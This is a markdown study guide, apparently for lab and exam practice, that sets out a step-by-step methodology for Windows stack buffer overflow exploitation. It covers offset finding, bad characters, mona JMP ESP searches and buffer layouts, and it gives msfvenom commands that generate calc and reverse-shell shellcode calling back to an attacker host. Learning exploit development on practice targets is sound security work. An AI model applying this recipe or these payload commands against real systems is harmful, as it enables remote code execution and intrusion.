# General buffer overflow methodology


## High-level
1. crash (FUZZ/SPIKE)
1. replicate crash
1. Find/Controlling `#!asm EIP` exact byte
1. Make sure space for shellcode is enough
1. Find Bad Characters
1. Find `#!asm JMP` function
1. Make shellcode * pop calc
1. Make shellcode * reverse_shell
1. Try to exit payload gracefully

## Detailed Instructions

 * Load service in Immunity Debugger
 * Fuzz using [Fuzzing_Script.py](./Fuzzing_Scripts/Simple_Fuzz.html)
 * Replicate Crash using [BOF_Skeleton.py](./Skeleton.html)
 * Find bytes by sending unique string
	* 
		```bash
		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number_of_buffer>
		```
	* Plugin it into[BOF_Skeleton.py](./Skeleton.html)
		* Swap "A"s with pattern_create output
    * `#!python !mona findmsp`
    * or
 	* 
 		```bash
 		/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <number_of_buffer> -q <value_in_register>
 		```
 * Modify [BOF_Skeleton.py](./Skeleton.html) to `#!python "A"*<result_from_pattern_offset.rb> + "B"*4 + "C"*<value of As and Bs * original buffer used for crashing the application>`
    * i.e. `#!python buffer = 'A'*2606+'B'*4+'C'*(3100-2606-4)`
 * Find where to put shellcode and redirect/replace value of the `#!asm EIP` register (Bs or `42424242`)
	* Usually where the Cs are (`#!asm ESP`? `#!asm EAX`?) or probably the As?
		* Find out if the As or Cs or the suitable location of payload is 350 bytes to 400 bytes in size (average size of shellcode)
			* If not try to increase [BOF_Skeleton.py](./Skeleton.html) buffer size (Replicate Crashing using [BOF_Skeleton.py](./Skeleton.html) above)
				* `#!python "C"*(NEW_SIZE * <EXISTING FORMULA>)`
					* i.e. `#!python "C"*2700-2606-4`
					* i.e. `#!python "C"*3500-2606-4`
					* i.e. `#!python "C"*4000-2606-4`
				* *Note: This does not always work, try to point to the As such as via EAX or other registers by making shellcode on the C section to `#!asm JMP` to `#!asm EAX` or do it straight from `#!asm EIP` (`#!asm JMP EAX`) or `#!asm JMP ESP` if it is to be placed there*
                    * *Do this NASM shell after you found the Bad Characters below since it would be a criteria in choosing base addresses without the bad chars*				
					* i.e.
						```bash
						ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
						```
						* `#!asm add eax,12`
						* `#!asm jmp eax`
 * Find Bad Characters
	* Usually NULL Bytes character `#!asm \x00`
		* For Mail Servers and others, the Carriage Return `#!asm \x0d`
	* Add long string of all hex character combinations
		* `#!python "A"*<result_from_pattern_offset.rb> + "B"*4 + badchars`
         ```python
         # all 255 bytes
         badchars = ( 
         "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
         "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
         "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
         "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
         "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
         "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
         "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
         "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
         "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
         "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
         "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
         "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
         "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
         "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
         "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
         "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
         ```

	* Look at what hex values disappear at the C section/badchars section and repeat till every badchar is knocked out of the list
	    * take note of the bad chars

 * Due to ASLR and random address for threaded stack based programs, find natural occurring jumps to be consistent `#!asm JMP <REGISTER_where_payload_is_observed_to_start>`
	* i.e. `#!asm JMP ESP` or `#!asm JMP EAX` depending of where the payload would start
     * `#!python !mona modules`
        * Look at "Log data" window
	    * Criteria to choose instruction (DLL)
		    * ASLR = False
		    * DEP  = False
		    * Rebase = False
		    * Memory range (Base) of the module (DLL) itself does not contain the bad characters (First four(4) bytes should not have bad chars)
		        * i.e. `#!asm 0x10000000` and `#!asm 0x00400000` has bad chars 
		        * i.e. `#!asm 0x5f400000` has no bad chars
	    * Find a naturally occurring JMP at the chosen module (DLL) (modules tab, Go to executable tab ("e") click on the module/property/dll, it will redirect to you the CPU register window the ++++ctrl+f++++ to find the instruction `#!asm JMP ###`)
	        * `#!python !mona jmp -r esp -m '<module_chosen>'`
	            * i.e. `#!python !mona jmp -r esp -m 'essfunc.dll'`
		    * find (++ctrl+f++)
			    * `#!asm JMP ESP`
			    * (or)
			    * (Sequence) (right click, Search for, sequence of commands)
				    * `#!asm push esp`
				    * `#!asm retn`
		    * if instructions does not exist go to "m" tab since the initial search (++ctrl+f++) only looks at the executable  tagged ("E")  areas/files only
			    * if module chosen earlier does not have DEP or ASLR then use any Readable "R" file and find the naturally occurring `#!asm JMPs` there
				    * find op code of `#!asm JMP ESP`
					    * ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
						    * `#!asm jmp esp`
							     * i.e. `#!asm jmp esp == FFE4`
					    * `#!python !mona find -s "\xff\xe4" -m <target_module>`
						    * i.e. `#!python !mona find -s "\xff\xe4" -m slmfc.dll`
						    * choose address that does not contain any bad characters
				    * Go to address and verify `#!asm JMP <REGISTER>` code
				    * copy the address and replace the "B"s in [BOF_Skeleton.py](./Skeleton.html)
					    * remember to write address in reverse because x86 arch stores address in memory using little endian format
				    * test the code and place a breakpoint ++f2++ on the `#!asm JMP <REGISTER>` address just to see if on the actual BOF, it places the right address in the right order in `#!asm EIP`
				
 * Pop calc!
    * calc.exe:
    	```bash
    	msfvenom -p windows/exec EXITFUNC=thread CMD=calc.exe -f python -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -v shellcode_calc
    	```
    
 * 
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> EXITFUNC=<process/thread/seh> LPORT=<lport> -f <language> -a <arch> --platform <platform> -b "<bad chars>" -e <encoder> -v shellcode_rev
```

	* i.e. 
		```bash
		msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=7777 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -v shellcode_rev
		```
	* Troubleshooting calc.exe:
		```bash
		msfvenom -p windows/exec EXITFUNC=thread CMD=calc.exe -f python -v shellcode_calc -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai
		```
	* other payload = 
	* copy shellcode to [BOF_Skeleton.py](./Skeleton.html)
	* Adjust buffer length
		* i.e. `#!python "A"*2606 + "\x8f\x35\x4a\x5f" + shellcode + "C"*(3500-2606-4-351)`
	* Decoder Stub avoidance:
	    * EASY MODE: Add NOPs `#!asm \x90` to stack space for shellcode to work with * ~16 NOPs enough
	    * PRO MODE: Use `#!asm sub esp,0x10` `#!asm \x83\xec\x10` or `#!asm sub eax,0x10` `#!asm \x83\xe8\x10` instead, saves precious buffer space
	    * Use ruby nasm to know opcode value
	* EXITFUNC = thread for threaded applications, process and seh for IDK?
	* Adjust buffer length again to accommodate NOPs
		* i.e. `#!python "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C"*(3500-2606-4-351-16)`
	* Other shellcodes [Shell-storm](http://shell-storm.org/shellcode/)




## Shortcuts

* ++f2++ : Place breakpoint
* ++f7++ : play (each instruction/execution flow)
* ++ctrl+f7++ : Autoplay slowly
* ++f9++ : play till crash or forever


## Observations

* Try different `#!asm JMP ESP `address = Works
* Try without shikata_ga_nai = will not avoid bad chars without encoding
* Try without NOPs sled  = It does overwrite itself indeed
* Try NOPs sled only 8 as per guide = works, it turns out it is fine to overwrite the first 8 bytes of shellcode/encoder 
